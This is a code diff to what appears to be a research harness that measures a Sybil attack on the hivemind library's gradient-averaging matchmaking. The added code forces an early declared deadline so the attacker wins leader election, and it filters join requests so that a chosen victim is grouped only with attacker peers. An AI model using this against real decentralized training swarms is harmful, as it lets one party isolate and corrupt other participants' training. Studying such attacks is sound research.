@@ -57,6 +57,7 @@ from hivemind.optim.grad_averager import GradientAverager
 from hivemind.p2p import P2PContext
 from hivemind.proto import averaging_pb2
 from hivemind.utils.crypto import RSAPrivateKey
+from hivemind.utils.timed_storage import get_dht_time
 
 # The task is imported rather than copied so damage is comparable against the 0.1492
 # baseline. step2_groups guards its main() behind __name__, so importing is side-effect
@@ -82,12 +83,57 @@ class CapturingGradientAverager(GradientAverager):
     hammering the leader cannot crowd the victim out.
     """
 
-    def __init__(self, *args, group_log: mp.Queue = None, peer_index: int = -1, admit=None, **kwargs):
+    def __init__(
+        self,
+        *args,
+        group_log: mp.Queue = None,
+        peer_index: int = -1,
+        admit=None,
+        victim_id: str = None,
+        force_early_schedule: bool = False,
+        override_min_matchmaking_time: float = None,
+        **kwargs,
+    ):
+        # Decouple the two things Optimizer ties together. optimizer.py:562 gates
+        # pre-scheduling on `estimated_next_update_time - now <= matchmaking_time`, and
+        # optimizer.py:307 passes that same number to the averager as
+        # min_matchmaking_time, which sets the declared deadline. Because the gate fires
+        # at E - matchmaking_time and the deadline is then now + min_matchmaking_time, the
+        # two cancel and every peer declares E, the shared epoch-end estimate.
+        #
+        # Overriding only the averager's copy lets the attacker start advertising early
+        # (a large Optimizer matchmaking_time) while declaring a short rolling deadline
+        # (a small one here), which is the only configuration that declares earlier than E.
+        if override_min_matchmaking_time is not None:
+            kwargs["min_matchmaking_time"] = override_min_matchmaking_time
         self._group_log = group_log
         self._peer_index = peer_index
         self._admit = admit
+        self._victim_id = victim_id
+        self._force_early_schedule = force_early_schedule
         self._round = 0
         super().__init__(*args, **kwargs)
+
+    def schedule_step(self, scheduled_time=None, **kwargs):
+        """Declare the earliest deadline in the swarm, and so win the leadership election.
+
+        `Optimizer` never passes a scheduled_time (optimizer.py:568), so it defaults to
+        `now + min_matchmaking_time` at the moment of pre-scheduling (averager.py:394-395)
+        -- and pre-scheduling fires when `estimated_next_update_time - now <=
+        matchmaking_time` (optimizer.py:562). Optimizer passes the same number to both, so
+        the two cancel and every peer's scheduled_time lands on the shared epoch-end
+        estimate however it is configured. That is why tuning matchmaking_time alone moved
+        capture only from 0% to 20% (HANDOFF.md section 6.4).
+
+        Forcing scheduled_time into the present makes the declared deadline
+        `max(scheduled_time, now + min_matchmaking_time)` (matchmaking.py:527-531) fall
+        through to the second term, which the attacker does control. The only constraint is
+        `scheduled_time < deadline` (averager.py:401), and the deadline is
+        `now + averaging_timeout`.
+        """
+        if self._force_early_schedule:
+            scheduled_time = get_dht_time()
+        return super().schedule_step(scheduled_time=scheduled_time, **kwargs)
 
     async def rpc_join_group(
         self, request: averaging_pb2.JoinRequest, context: P2PContext
@@ -95,11 +141,27 @@ class CapturingGradientAverager(GradientAverager):
         # The annotations are load-bearing, not decoration: handlers are discovered by
         # reading type hints (hivemind/p2p/servicer.py:_collect_rpc_handlers), and an
         # override without them raises at averager startup.
-        if self._admit is not None and str(context.remote_id) not in self._admit:
-            yield averaging_pb2.MessageFromLeader(code=averaging_pb2.GROUP_IS_FULL)
-            return
+        if self._admit is not None:
+            requester = str(context.remote_id)
+            if requester not in self._admit:
+                yield averaging_pb2.MessageFromLeader(code=averaging_pb2.GROUP_IS_FULL)
+                return
+            # Admit our own peers only once the victim is already in. Without this the
+            # leader reaches min_group_size = 2 on its own Sybils and assembles on its
+            # deadline before the victim arrives -- measured at k=2, where the attackers'
+            # groups were size 2 in 36 of 42 observations, the two of them pairing up with
+            # no victim present. A group that never reaches min_group_size disbands and
+            # retries (matchmaking.py:298-299), which is the better outcome: an empty round
+            # beats a round spent averaging with ourselves.
+            if requester != self._victim_id and not self._victim_is_present():
+                yield averaging_pb2.MessageFromLeader(code=averaging_pb2.GROUP_IS_FULL)
+                return
         async for response in super().rpc_join_group(request, context):
             yield response
+
+    def _victim_is_present(self) -> bool:
+        followers = getattr(self._matchmaking, "current_followers", {})
+        return any(str(peer_id) == self._victim_id for peer_id in followers)
 
     async def _aggregate_with_group(self, group_info, min_vector_size, **kwargs):
         if self._group_log is not None:
@@ -182,6 +244,9 @@ def run_peer(
             group_log=group_log,
             peer_index=peer_index,
             admit=admit,
+            victim_id=roster[VICTIM],
+            force_early_schedule=attacking and not args.no_force_schedule,
+            override_min_matchmaking_time=args.attacker_declare_time if attacking else None,
             target_group_size=args.group_size,
         ),
         verbose=False,
@@ -253,7 +318,14 @@ def main() -> None:
     parser.add_argument("--lr", type=float, default=0.1)
     parser.add_argument("--matchmaking-time", type=float, default=5.0)
     parser.add_argument("--attacker-matchmaking-time", type=float, default=2.0,
-                        help="smaller than everyone else's, which is what wins leadership")
+                        help="the attacker's declared deadline, once the schedule is forced")
+    parser.add_argument("--attacker-declare-time", type=float, default=None,
+                        help="the averager's own min_matchmaking_time for attacking peers, set "
+                             "independently of Optimizer's matchmaking_time; this is the only way "
+                             "to declare a deadline earlier than the shared epoch-end estimate")
+    parser.add_argument("--no-force-schedule", action="store_true",
+                        help="leave scheduled_time at its default, which is the pre-fix behaviour "
+                             "measured in HANDOFF.md section 6.4")
     parser.add_argument("--averaging-timeout", type=float, default=30.0)
     parser.add_argument("--run-id", type=str, default=None)
     parser.add_argument("--tag", type=str, default=None)
@@ -271,6 +343,8 @@ def main() -> None:
     if args.arm == "malicious":
         print(f"attacker declares matchmaking_time {args.attacker_matchmaking_time}s against "
               f"{args.matchmaking_time}s, and admits only itself plus the victim")
+        print(f"scheduled_time forced early: {not args.no_force_schedule}; "
+              f"averager declare time: {args.attacker_declare_time}")
     print()
 
     bootstrap = DHT(host_maddrs=LOCALHOST, start=True)
